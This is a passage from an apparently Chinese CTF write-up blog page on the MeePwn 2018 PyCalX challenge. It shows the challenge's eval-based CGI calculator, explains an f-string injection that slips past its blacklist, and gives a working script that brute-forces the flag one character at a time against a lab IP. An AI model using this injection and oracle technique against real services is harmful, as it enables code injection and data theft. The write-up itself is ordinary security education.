class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line">    </span><br><span class="line">    op = get_op(get_value(arguments[<span class="string">&#x27;op&#x27;</span>].value))</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Invalid&quot;</span>) <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure></p>
+<p>op 也会被 blacklist 过滤一遍，不能使用’了，目前也没有什么好用的方法继续绕过了。注意到一件事，题目用的 Python 版本为 Python3，会不会有什么特别的功能了？确实有，<a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0498/">f-string</a>。f-string 里可以引入判断，所以思路要换一下：Tru 通过 value1 输出，而 e 通过条件判断。就是要构造 f’{FLAG&gt;source or “e” }’，当 FLAG&gt;source 时输出 1，否则输出 e。那么脚本就很好写了，稍微改一下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://192.168.60.131/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">source=<span class="string">&quot;&quot;</span></span><br><span class="line">value1=urllib.parse.quote(<span class="string">&quot;T&quot;</span>)</span><br><span class="line">op=urllib.parse.quote(<span class="string">&quot;+f&quot;</span>)</span><br><span class="line">value2=urllib.parse.quote(<span class="string">&quot;ru&#123;FLAG&gt;source or 14:x&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    prev = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> chr(i) <span class="keyword">in</span> string.printable:</span><br><span class="line">            source=flag+chr(prev)</span><br><span class="line">            source=urllib.parse.quote(source)</span><br><span class="line">            result=requests.get(url.format(source,value1,op,value2)).text</span><br><span class="line">            <span class="comment">#print(result)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&quot;security&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                flag+=chr(prev<span class="number">-1</span>)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prev=i</span><br></pre></td></tr></table></figure></p>
+
+    <div id="aplayer-BhLnzkIL" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="30064351" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{5b6e26f3-ad46-4165-9f55-7766c3bb2fff}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/" title="MeePwn2018-PyCalX 1-2">http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/f-string/" rel="tag"><i class="fa fa-tag"></i> f-string</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/05/15/35C3CTF-php/" rel="prev" title="35C3CTF-php">
+                  <i class="fa fa-chevron-left"></i> 35C3CTF-php
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/" rel="next" title="Insomni-hack-teaser-2019-l33-hoster">
+                  Insomni-hack-teaser-2019-l33-hoster <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/05/15/MeePwn2018-PyCalX-1-2/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
